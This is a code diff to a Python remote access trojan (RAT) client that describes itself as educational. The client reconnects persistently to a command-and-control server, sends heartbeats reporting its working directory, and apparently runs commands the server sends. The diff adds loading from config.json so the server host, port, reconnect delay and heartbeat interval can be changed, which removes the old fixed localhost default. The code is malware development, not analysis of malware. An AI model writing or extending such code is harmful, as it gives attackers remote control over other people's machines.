@@ -25,7 +25,8 @@ import time
 from typing import Any, Dict
 
 
-DEFAULT_RECONNECT_DELAY = 5.0  # seconds
+DEFAULT_RECONNECT_DELAY = 5.0  # seconds (can be overridden via config)
+DEFAULT_HEARTBEAT_INTERVAL = 20.0  # seconds (can be overridden via config)
 
 
 def send_json_line(sock: socket.socket, payload: Dict[str, Any]) -> None:
@@ -83,7 +84,9 @@ def run_command(cmd: str, cwd: str | None = None) -> Dict[str, Any]:
         return {"ok": False, "error": repr(exc)}
 
 
-def heartbeat_loop(sock: socket.socket, stop_event: threading.Event) -> None:
+def heartbeat_loop(
+    sock: socket.socket, stop_event: threading.Event, interval: float
+) -> None:
     """
     Periodically send a small heartbeat so the server can see we're alive.
     """
@@ -92,10 +95,10 @@ def heartbeat_loop(sock: socket.socket, stop_event: threading.Event) -> None:
             send_json_line(sock, {"type": "heartbeat", "cwd": os.getcwd()})
         except OSError:
             break
-        stop_event.wait(20.0)
+        stop_event.wait(interval)
 
 
-def client_loop(host: str, port: int) -> None:
+def client_loop(host: str, port: int, reconnect_delay: float, hb_interval: float) -> None:
     """
     Connect to the CNC server and process commands.
     """
@@ -105,13 +108,15 @@ def client_loop(host: str, port: int) -> None:
             sock.connect((host, port))
         except OSError as exc:
             print(f"[rat] Failed to connect to {host}:{port}: {exc}", file=sys.stderr)
-            time.sleep(DEFAULT_RECONNECT_DELAY)
+            time.sleep(reconnect_delay)
             continue
 
         print(f"[rat] Connected to CNC at {host}:{port}")
         stop_event = threading.Event()
         hb_thread = threading.Thread(
-            target=heartbeat_loop, args=(sock, stop_event), daemon=True
+            target=heartbeat_loop,
+            args=(sock, stop_event, hb_interval),
+            daemon=True,
         )
         hb_thread.start()
 
@@ -197,27 +202,74 @@ def client_loop(host: str, port: int) -> None:
         time.sleep(DEFAULT_RECONNECT_DELAY)
 
 
+def load_config() -> Dict[str, Any]:
+    """
+    Load configuration from config.json in the same directory as this script,
+    if it exists. Returns an empty dict if it cannot be loaded.
+    """
+    path = os.path.join(os.path.dirname(__file__), "config.json")
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except OSError:
+        return {}
+    except json.JSONDecodeError:
+        # Ignore invalid config to keep the client running
+        return {}
+
+
 def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
     parser = argparse.ArgumentParser(
         description="Educational RAT client that connects to a CNC server.",
     )
     parser.add_argument(
         "--host",
-        default="127.0.0.1",
-        help="CNC server hostname or IP (default: 127.0.0.1)",
+        help="CNC server hostname or IP (overrides config.json if provided)",
     )
     parser.add_argument(
         "--port",
         type=int,
-        default=9001,
-        help="CNC server TCP port (default: 9001)",
+        help="CNC server TCP port (overrides config.json if provided)",
+    )
+    parser.add_argument(
+        "--reconnect-delay",
+        type=float,
+        help="Seconds to wait before reconnecting (overrides config.json if provided)",
+    )
+    parser.add_argument(
+        "--heartbeat-interval",
+        type=float,
+        help="Seconds between heartbeat messages (overrides config.json if provided)",
     )
     return parser.parse_args(argv)
 
 
 def main(argv: list[str] | None = None) -> None:
+    cfg = load_config()
+    client_cfg = cfg.get("client") if isinstance(cfg, dict) else {}
+
     args = parse_args(argv)
-    client_loop(args.host, args.port)
+
+    host = args.host or (client_cfg.get("host") if isinstance(client_cfg, dict) else None) or "127.0.0.1"
+    port = args.port or int(
+        (client_cfg.get("port") if isinstance(client_cfg, dict) else 9001)
+    )
+    reconnect_delay = (
+        args.reconnect_delay
+        if args.reconnect_delay is not None
+        else float(
+            (client_cfg.get("reconnect_delay") if isinstance(client_cfg, dict) else DEFAULT_RECONNECT_DELAY)
+        )
+    )
+    hb_interval = (
+        args.heartbeat_interval
+        if args.heartbeat_interval is not None
+        else float(
+            (client_cfg.get("heartbeat_interval") if isinstance(client_cfg, dict) else DEFAULT_HEARTBEAT_INTERVAL)
+        )
+    )
+
+    client_loop(host, port, reconnect_delay, hb_interval)
 
 
 if __name__ == "__main__":
